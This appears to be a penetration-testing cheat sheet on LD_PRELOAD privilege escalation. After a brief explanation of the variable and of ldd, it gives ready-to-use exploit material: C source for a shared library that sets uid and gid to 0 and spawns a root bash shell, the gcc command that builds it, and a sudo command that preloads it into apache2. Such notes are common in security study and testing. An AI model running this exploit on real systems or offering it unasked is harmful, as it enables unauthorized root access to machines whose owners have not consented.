 The `LD_PRELOAD` environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the `ldd` utility.
#### List required shared library for a binary
```shell
ldd /bin/ls
```

## LD_PRELOAD Privilege Escalation
#### Requirements
- sudo -l
	- env_keep+=LD_PRELOAD
	- A binary we can run as sudo (sudoers or SUID)
#### Exploit
If we can run `/usr/sbin/apache2 restart` as root:
1. Create a malicious shared library
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

```shell
gcc -fPIC -shared -o root.so root.c -nostartfiles
```
2. Run the binary with the malicious library:
```shell
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```
